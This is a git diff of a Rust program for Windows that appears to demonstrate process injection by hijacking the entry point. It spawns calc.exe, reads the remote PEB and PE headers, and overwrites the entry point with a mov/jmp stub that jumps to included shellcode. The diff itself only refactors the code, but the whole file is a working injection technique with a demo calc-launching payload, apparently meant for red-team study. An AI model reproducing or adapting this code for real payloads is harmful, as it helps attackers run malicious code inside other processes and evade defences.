@@ -17,11 +17,22 @@ use windows_sys::Win32::System::Threading::{
     PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
 };
 
+const X64: u16 = 0x8664_u16;
+const X86: u16 = 0x14c_u16;
+const MZ: u16 = 0x5a4d_u16;
+const PE: u32 = 0x4550_u32;
+
 #[cfg(target_os = "windows")]
 fn main() {
     let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
     let shellcode_size = shellcode.len();
     let program = b"C:\\Windows\\System32\\calc.exe\0";
+
+    #[repr(C)]
+    struct Peb {
+        reserved: [c_char; 0x10],
+        image_base_address: *mut c_void,
+    }
 
     unsafe {
         let mut process_info: PROCESS_INFORMATION = zeroed();
@@ -92,12 +103,6 @@ fn main() {
             panic!("[-]NtQueryInformationProcess failed: {}!", GetLastError());
         }
 
-        #[repr(C)]
-        struct Peb {
-            reserved: [c_char; 0x10],
-            image_base_address: *mut c_void,
-        }
-
         let read_process_memory = |addr: *const c_void, out: *mut c_void, size: usize| {
             let res = ReadProcessMemory(process_info.hProcess, addr, out, size, null_mut());
             if res == FALSE {
@@ -118,7 +123,7 @@ fn main() {
             addr_of_mut!(dos_header).cast(),
             size_of_val(&dos_header),
         );
-        if dos_header.e_magic != 0x5a4d_u16 {
+        if dos_header.e_magic != MZ {
             panic!("[-]DOS image header magic was not 0x5a4d!");
         }
 
@@ -128,7 +133,7 @@ fn main() {
             addr_of_mut!(signature).cast(),
             size_of_val(&signature),
         );
-        if signature != 0x4550_u32 {
+        if signature != PE {
             panic!("[-]PE Signature was not 0x4550");
         }
 
@@ -141,62 +146,45 @@ fn main() {
             size_of_val(&pe_header),
         );
 
-        let mut opt_header64: IMAGE_OPTIONAL_HEADER64 = zeroed();
-        let mut opt_header32: IMAGE_OPTIONAL_HEADER32 = zeroed();
-        match pe_header.Machine {
-            0x8664_u16 => {
-                read_process_memory(
-                    ((peb.image_base_address as usize)
-                        + (dos_header.e_lfanew as usize)
-                        + size_of_val(&signature)
-                        + size_of_val(&pe_header)) as *const c_void,
-                    addr_of_mut!(opt_header64).cast(),
-                    size_of_val(&opt_header64),
-                );
-            }
-            0x14c_u16 => {
-                read_process_memory(
-                    ((peb.image_base_address as usize)
-                        + (dos_header.e_lfanew as usize)
-                        + size_of_val(&signature)
-                        + size_of_val(&pe_header)) as *const c_void,
-                    addr_of_mut!(opt_header32).cast(),
-                    size_of_val(&opt_header32),
-                );
-            }
-            _ => panic!(
-                "[-]Unknow IMAGE_OPTIONAL_HEADER type for machine type: {:#x}",
-                pe_header.Machine
-            ),
-        }
+        let entrypoint;
+        let mut ep_buffer = vec![];
 
-        let ep = match pe_header.Machine {
-            0x8664_u16 => {
+        let read_opt_header = |header: *mut c_void, size: usize| {
+            read_process_memory(
                 ((peb.image_base_address as usize)
-                    + usize::try_from(opt_header64.AddressOfEntryPoint)
-                        .expect("[-]usize::try_from failed!")) as *mut c_void
-            }
-            0x14c_u16 => {
-                ((peb.image_base_address as usize)
-                    + usize::try_from(opt_header32.AddressOfEntryPoint)
-                        .expect("[-]usize::try_from failed!")) as *mut c_void
-            }
-            _ => panic!(
-                "[-]Unknow IMAGE_OPTIONAL_HEADER type for machine type: {:#x}",
-                pe_header.Machine
-            ),
+                    + (dos_header.e_lfanew as usize)
+                    + size_of_val(&signature)
+                    + size_of_val(&pe_header)) as *const c_void,
+                header,
+                size,
+            );
         };
 
-        let mut ep_buffer = vec![];
         match pe_header.Machine {
-            0x8664_u16 => {
+            X64 => {
+                let mut opt_header: IMAGE_OPTIONAL_HEADER64 = zeroed();
+                read_opt_header(addr_of_mut!(opt_header).cast(), size_of_val(&opt_header));
+
+                entrypoint = ((peb.image_base_address as usize)
+                    + usize::try_from(opt_header.AddressOfEntryPoint)
+                        .expect("[-]usize::try_from failed!"))
+                    as *mut c_void;
+
                 // rex; mov eax
                 ep_buffer.push(0x48_u8);
                 ep_buffer.push(0xb8_u8);
                 let mut shellcode_addr = (addr as usize).to_le_bytes().to_vec();
                 ep_buffer.append(&mut shellcode_addr);
             }
-            0x14c_u16 => {
+            X86 => {
+                let mut opt_header: IMAGE_OPTIONAL_HEADER32 = zeroed();
+                read_opt_header(addr_of_mut!(opt_header).cast(), size_of_val(&opt_header));
+
+                entrypoint = ((peb.image_base_address as usize)
+                    + usize::try_from(opt_header.AddressOfEntryPoint)
+                        .expect("[-]usize::try_from failed!"))
+                    as *mut c_void;
+
                 // mov eax
                 ep_buffer.push(0xb8_u8);
                 let mut shellcode_addr = (addr as usize).to_le_bytes().to_vec();
@@ -207,13 +195,14 @@ fn main() {
                 pe_header.Machine
             ),
         }
+
         // jmp [r|e]ax
         ep_buffer.push(0xff_u8);
         ep_buffer.push(0xe0_u8);
 
         let res = WriteProcessMemory(
             process_info.hProcess,
-            ep,
+            entrypoint,
             ep_buffer.as_ptr().cast(),
             ep_buffer.len(),
             null_mut(),
@@ -231,6 +220,7 @@ fn main() {
         if res == FALSE {
             panic!("[-]CloseHandle failed: {}!", GetLastError());
         }
+
         let res = CloseHandle(process_info.hThread);
         if res == FALSE {
             panic!("[-]CloseHandle failed: {}!", GetLastError());
